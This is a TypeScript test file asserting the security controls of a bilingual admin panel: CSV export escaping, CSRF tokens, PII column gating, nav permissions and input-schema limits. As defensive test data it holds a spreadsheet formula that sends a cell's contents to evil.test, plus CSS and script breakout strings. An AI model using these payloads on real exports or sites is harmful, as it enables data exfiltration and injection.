import { describe, it, expect } from 'vitest';
import { toCsv } from '@/lib/admin/csv';
import { csrfTokenMatches, generateCsrfToken, timingSafeEqual } from '@/lib/http/csrf';
import {
  canSeeLeadPii,
  canManageLeads,
  leadColumnsFor,
  stripSensitive,
} from '@/lib/admin/leadFields';
import { ADMIN_NAV, isVisible, visibleNav } from '@/lib/admin/nav';
import { ROLE_CAPS } from '@/lib/authz/matrix';
import { ROLES, type Role } from '@/lib/auth/types';
import {
  MaintenanceSchema,
  RedirectWriteSchema,
  SiteSettingsSchema,
  ThemeTokensSchema,
  AiConfigSchema,
  EntitySeoWriteSchema,
} from '@schemas/admin';

// The targeted security regressions from CLAUDE.md §9 that live in pure modules and can
// therefore be asserted without a database or a browser.

// ── CSV / formula injection ─────────────────────────────────────────────────────

describe('CSV export escaping', () => {
  it('neutralises spreadsheet formulas in attacker-controlled cells', () => {
    // Every cell in a lead export comes from a public form. `=HYPERLINK(...)` in a name
    // field exfiltrates the row when an admin opens the file.
    const csv = toCsv(['name'], [{ name: '=HYPERLINK("https://evil.test?x="&A1,"Click")' }]);
    expect(csv).toContain(`"'=HYPERLINK`);
    expect(csv).not.toContain('"=HYPERLINK');
  });

  for (const trigger of ['=', '+', '-', '@', '\t', '\r']) {
    it(`prefixes a cell starting with ${JSON.stringify(trigger)}`, () => {
      const csv = toCsv(['v'], [{ v: `${trigger}cmd` }]);
      expect(csv).toContain(`"'${trigger}cmd"`);
    });
  }

  it('quotes per RFC 4180 and doubles internal quotes', () => {
    const csv = toCsv(['v'], [{ v: 'a,b "quoted"\nsecond' }]);
    expect(csv).toContain('"a,b ""quoted""\nsecond"');
  });

  it('emits a BOM so Excel decodes Arabic correctly', () => {
    expect(toCsv(['v'], [{ v: 'مرحبا' }]).charCodeAt(0)).toBe(0xfeff);
  });

  it('renders null and undefined as empty rather than the words', () => {
    const csv = toCsv(['a', 'b'], [{ a: null, b: undefined }]);
    expect(csv).not.toContain('null');
    expect(csv).not.toContain('undefined');
  });
});

// ── CSRF double-submit ──────────────────────────────────────────────────────────

describe('CSRF double-submit', () => {
  it('mints 256 bits of hex', () => {
    const token = generateCsrfToken();
    expect(token).toMatch(/^[0-9a-f]{64}$/);
    expect(generateCsrfToken()).not.toBe(token);
  });

  it('matches only identical tokens', () => {
    const token = generateCsrfToken();
    expect(csrfTokenMatches(token, token)).toBe(true);
    expect(csrfTokenMatches(token, `${token}x`)).toBe(false);
    expect(csrfTokenMatches(token, token.slice(0, -1))).toBe(false);
  });

  it('refuses when either half is missing — absence is never a pass', () => {
    const token = generateCsrfToken();
    expect(csrfTokenMatches(null, token)).toBe(false);
    expect(csrfTokenMatches(token, null)).toBe(false);
    expect(csrfTokenMatches(null, null)).toBe(false);
    expect(csrfTokenMatches('', '')).toBe(false);
  });

  it('compares without early exit on length', () => {
    expect(timingSafeEqual('abc', 'abc')).toBe(true);
    expect(timingSafeEqual('abc', 'abd')).toBe(false);
    expect(timingSafeEqual('abc', 'abcdef')).toBe(false);
  });
});

// ── Lead PII field visibility ───────────────────────────────────────────────────

describe('lead field visibility', () => {
  it('grants lead access to Admin and Developer only', () => {
    expect(ROLES.filter(canManageLeads).sort()).toEqual(['admin', 'developer']);
    expect(ROLES.filter(canSeeLeadPii).sort()).toEqual(['admin', 'developer']);
  });

  it('gives Content Creator and SEO no lead columns at all', () => {
    for (const role of ['content_creator', 'seo'] as Role[]) {
      expect(canManageLeads(role)).toBe(false);
      expect(canSeeLeadPii(role)).toBe(false);
      // Even the safe projection is unreachable for them — assertCap refuses first —
      // but the projection itself must never include the four gated columns.
      const columns = leadColumnsFor(role);
      for (const column of [
        'budget_enc',
        'timeline_band',
        'internal_notes',
        'ip_inet',
        'email_enc',
        'phone_enc',
      ]) {
        expect(columns, `${role} projection leaked ${column}`).not.toContain(column);
      }
    }
  });

  it('strips every sensitive key from an outbound row', () => {
    const stripped = stripSensitive({
      id: '1',
      name: 'A',
      email_enc: 'x',
      phone_enc: 'y',
      budget_enc: 'z',
      timeline_band: '3-6m',
      internal_notes: 'private',
      ip_inet: '203.0.113.1',
    });
    expect(stripped).toEqual({ id: '1', name: 'A' });
  });
});

// ── Admin nav is derived, never hand-listed ─────────────────────────────────────

describe('admin navigation gating', () => {
  it('never shows a link whose capabilities the role lacks', () => {
    for (const role of ROLES) {
      for (const group of ADMIN_NAV) {
        for (const link of group.links) {
          if (!isVisible(role, link)) continue;
          const allowed = link.access ?? ['full', 'view', 'meta'];
          const granted = link.caps.some((cap) => allowed.includes(ROLE_CAPS[role][cap]));
          expect(granted, `${role} sees ${link.href} without a capability`).toBe(true);
        }
      }
    }
  });

  it('hides leads from Content Creator and SEO', () => {
    for (const role of ['content_creator', 'seo'] as Role[]) {
      const hrefs = visibleNav(role).flatMap((g) => g.links.map((l) => l.href));
      expect(hrefs).not.toContain('/admin/leads');
      expect(hrefs).not.toContain('/admin/users');
      expect(hrefs).not.toContain('/admin/audit');
    }
  });

  it('hides content authoring from Developer', () => {
    const hrefs = visibleNav('developer').flatMap((g) => g.links.map((l) => l.href));
    expect(hrefs).not.toContain('/admin/services');
    expect(hrefs).not.toContain('/admin/blog');
    // …but keeps the technical surfaces §5 grants it.
    expect(hrefs).toContain('/admin/leads');
    expect(hrefs).toContain('/admin/logs');
    expect(hrefs).toContain('/admin/site-health');
  });

  it('gives every role a non-empty menu, and Admin the largest', () => {
    const sizes = ROLES.map((role) => visibleNav(role).flatMap((g) => g.links).length);
    for (const size of sizes) expect(size).toBeGreaterThan(0);
    expect(Math.max(...sizes)).toBe(visibleNav('admin').flatMap((g) => g.links).length);
  });
});

// ── Input-boundary regressions ──────────────────────────────────────────────────

describe('theme tokens are CSS custom properties only', () => {
  it('rejects a value that could break out of the declaration', () => {
    // With no 'unsafe-inline' in style-src, tokens are injected into one nonced <style>
    // block. A value containing `;` or `}` escapes its declaration and authors CSS.
    expect(ThemeTokensSchema.safeParse({ '--x': 'red; } body { display:none' }).success).toBe(
      false,
    );
    expect(ThemeTokensSchema.safeParse({ '--x': 'red</style><script>' }).success).toBe(false);
    expect(ThemeTokensSchema.safeParse({ '--x': 'url(javascript:alert(1))' }).success).toBe(true);
  });

  it('rejects key names that are not custom properties', () => {
    expect(ThemeTokensSchema.safeParse({ color: 'red' }).success).toBe(false);
    expect(ThemeTokensSchema.safeParse({ '--ok-name': '#fff' }).success).toBe(true);
  });
});

describe('retention horizons may shorten but never extend', () => {
  it('caps raw telemetry at the 90-day PDPL commitment', () => {
    expect(
      SiteSettingsSchema.safeParse({ retention: { raw_telemetry_days: 30 }, version: 1 }).success,
    ).toBe(true);
    expect(
      SiteSettingsSchema.safeParse({ retention: { raw_telemetry_days: 90 }, version: 1 }).success,
    ).toBe(true);
    expect(
      SiteSettingsSchema.safeParse({ retention: { raw_telemetry_days: 365 }, version: 1 }).success,
    ).toBe(false);
  });
});

describe('AI cost envelope', () => {
  it('bounds the daily spend cap so a typo cannot lift it', () => {
    expect(AiConfigSchema.safeParse({ dailyUsdCap: 5, version: 1 }).success).toBe(true);
    expect(AiConfigSchema.safeParse({ dailyUsdCap: 50000, version: 1 }).success).toBe(false);
    expect(AiConfigSchema.safeParse({ dailyUsdCap: -1, version: 1 }).success).toBe(false);
  });
});

describe('redirects', () => {
  it('requires a site-relative source', () => {
    expect(
      RedirectWriteSchema.safeParse({ sourcePath: 'https://evil.test', targetPath: '/a' }).success,
    ).toBe(false);
    expect(RedirectWriteSchema.safeParse({ sourcePath: '/old', targetPath: '/new' }).success).toBe(
      true,
    );
  });

  it('accepts only the three documented status codes', () => {
    expect(
      RedirectWriteSchema.safeParse({ sourcePath: '/a', targetPath: '/b', status: 307 }).success,
    ).toBe(false);
    for (const status of [301, 302, 308]) {
      expect(
        RedirectWriteSchema.safeParse({ sourcePath: '/a', targetPath: '/b', status }).success,
      ).toBe(true);
    }
  });
});

describe('maintenance allowlist', () => {
  it('accepts IP literals and rejects hostnames', () => {
    expect(
      MaintenanceSchema.safeParse({ active: true, allowlist: ['203.0.113.4'], version: 1 }).success,
    ).toBe(true);
    expect(
      MaintenanceSchema.safeParse({ active: true, allowlist: ['::1'], version: 1 }).success,
    ).toBe(true);
    expect(
      MaintenanceSchema.safeParse({ active: true, allowlist: ['office.example.test'], version: 1 })
        .success,
    ).toBe(false);
  });
});

describe('per-entity SEO requires Arabic', () => {
  it('rejects an English-only meta pair (Pillar 3 blocks empty meta_*_ar)', () => {
    const base = {
      entityType: 'service' as const,
      entityId: '11111111-1111-4111-8111-111111111111',
    };
    expect(
      EntitySeoWriteSchema.safeParse({
        ...base,
        metaTitle: { en: 'Branding' },
        metaDescription: { en: 'x' },
      }).success,
    ).toBe(false);
    expect(
      EntitySeoWriteSchema.safeParse({
        ...base,
        metaTitle: { en: 'Branding', ar: 'الهوية' },
        metaDescription: { en: 'x', ar: 'ص' },
      }).success,
    ).toBe(true);
  });
});
